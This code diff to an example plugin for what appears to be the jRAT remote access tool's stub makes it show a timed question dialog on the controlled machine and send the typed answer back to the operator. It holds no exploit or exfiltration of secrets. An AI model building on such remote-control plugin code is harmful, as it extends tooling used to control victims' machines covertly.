@@ -2,6 +2,7 @@ package pro.jrat.stub;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
+import java.io.IOException;
 
 import pro.jrat.api.stub.StubPlugin;
 
@@ -43,13 +44,42 @@ public class ExampleStubPlugin extends StubPlugin {
 		if (header == HEADER) {
 			String title = dis.readUTF();
 			String message = dis.readUTF();
+			final int secondsToAnswer = dis.readInt();
 			
-			System.out.println(title + ", " + message);
+			@SuppressWarnings("serial")
+			final DialogQuestion answer = new DialogQuestion(title, message) {
+				@Override
+				public void onAnswer() {
+					try {
+						dos.writeByte(HEADER);
+						dos.writeUTF(this.getAnswer());
+					} catch (Exception e) {
+						e.printStackTrace();
+					}
+				}	
+			};
 			
-			String answer = "Test Answer";
+			answer.setVisible(true);
 			
-			dos.writeByte(HEADER);
-			dos.writeUTF(answer);
+			new Thread(new Runnable() {
+				@Override
+				public void run() {
+					try {
+						for (int i = secondsToAnswer; i > 0; i--) {
+							answer.setTimeLeftToAnswer(i);
+							Thread.sleep(1000L);
+						}
+						
+						answer.onAnswer();
+					} catch (Exception e) {
+						e.printStackTrace();
+					}
+					
+					
+				}
+			}).start();
+			
+			
 		}
 	}
 
